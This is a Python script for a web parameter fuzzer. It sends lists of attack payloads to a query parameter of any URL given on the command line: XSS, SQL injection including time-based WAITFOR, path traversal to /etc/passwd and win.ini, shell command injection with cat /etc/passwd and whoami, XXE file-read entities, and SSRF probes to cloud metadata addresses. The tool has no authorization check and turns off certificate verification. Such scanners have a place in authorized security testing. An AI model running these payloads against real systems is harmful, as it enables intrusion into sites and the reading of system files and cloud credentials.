#!/usr/bin/env python3
"""
Advanced Parameter Fuzzer
Fuzzes parameters with various payloads to detect vulnerabilities
"""

import requests
import sys
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import time

class ParameterFuzzer:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Fuzzer)'
        }
        
        # Comprehensive payload sets
        self.payloads = {
            'xss': [
                '<script>alert(1)</script>',
                '"><script>alert(1)</script>',
                "';alert(1);//",
                '<img src=x onerror=alert(1)>',
                'javascript:alert(1)',
                '<svg onload=alert(1)>',
                '{{7*7}}',
                '${7*7}',
            ],
            'sqli': [
                "' OR '1'='1",
                "' OR 1=1--",
                "1' UNION SELECT NULL--",
                "admin'--",
                "' AND '1'='2",
                "1' AND 1=1--",
                "' WAITFOR DELAY '00:00:05'--",
                "1' ORDER BY 1--",
            ],
            'lfi': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\win.ini',
                '/etc/passwd',
                'C:\\windows\\win.ini',
                '....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2fetc/passwd',
            ],
            'command': [
                '; ls',
                '| ls',
                '`ls`',
                '$(ls)',
                '; cat /etc/passwd',
                '&& whoami',
                '|| whoami',
            ],
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            ],
            'ssrf': [
                'http://localhost',
                'http://127.0.0.1',
                'http://169.254.169.254/latest/meta-data/',
                'http://metadata.google.internal',
                'file:///etc/passwd',
            ]
        }
    
    def fuzz_parameter(self, param_name, payload_type='xss'):
        """Fuzz a specific parameter with payload type"""
        print(f"[*] Fuzzing parameter: {param_name}")
        print(f"[*] Payload type: {payload_type}")
        print()
        
        findings = []
        
        payloads = self.payloads.get(payload_type, self.payloads['xss'])
        
        for i, payload in enumerate(payloads, 1):
            try:
                # Build test URL
                parsed = urlparse(self.target_url)
                query = parse_qs(parsed.query)
                query[param_name] = [payload]
                
                new_query = urlencode(query, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
                
                # Send request
                start = time.time()
                response = self.session.get(test_url, timeout=10, verify=False)
                elapsed = time.time() - start
                
                # Analyze response
                reflected = payload in response.text
                status_diff = response.status_code != 200
                time_diff = elapsed > 5.0
                
                if reflected or status_diff or time_diff:
                    print(f"[{i}/{len(payloads)}] Interesting response:")
                    print(f"    Payload: {payload[:50]}")
                    print(f"    Reflected: {reflected}")
                    print(f"    Status: {response.status_code}")
                    print(f"    Time: {elapsed:.2f}s")
                    print(f"    Length: {len(response.text)}")
                    
                    findings.append({
                        'payload': payload,
                        'reflected': reflected,
                        'status': response.status_code,
                        'time': elapsed,
                        'length': len(response.text)
                    })
                    print()
            
            except Exception as e:
                print(f"[!] Error with payload {i}: {str(e)}")
        
        print(f"\n[+] Total findings: {len(findings)}")
        return findings
    
    def fuzz_all_types(self, param_name):
        """Fuzz parameter with all payload types"""
        print("="*60)
        print("COMPREHENSIVE PARAMETER FUZZING")
        print("="*60)
        print(f"Target: {self.target_url}")
        print(f"Parameter: {param_name}")
        print()
        
        all_findings = {}
        
        for payload_type in self.payloads.keys():
            print(f"\n{'='*60}")
            print(f"Testing: {payload_type.upper()}")
            print('='*60)
            print()
            
            findings = self.fuzz_parameter(param_name, payload_type)
            all_findings[payload_type] = findings
            
            time.sleep(1)  # Rate limiting
        
        # Summary
        print("\n" + "="*60)
        print("FUZZING SUMMARY")
        print("="*60)
        
        for payload_type, findings in all_findings.items():
            print(f"{payload_type.upper()}: {len(findings)} interesting responses")
        
        total = sum(len(f) for f in all_findings.values())
        print(f"\nTotal findings: {total}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python fuzzer.py <url> <parameter> [type]")
        print("Types: xss, sqli, lfi, command, xxe, ssrf, all")
        sys.exit(1)
    
    url = sys.argv[1]
    param = sys.argv[2]
    payload_type = sys.argv[3] if len(sys.argv) > 3 else 'all'
    
    fuzzer = ParameterFuzzer(url)
    
    if payload_type == 'all':
        fuzzer.fuzz_all_types(param)
    else:
        fuzzer.fuzz_parameter(param, payload_type)
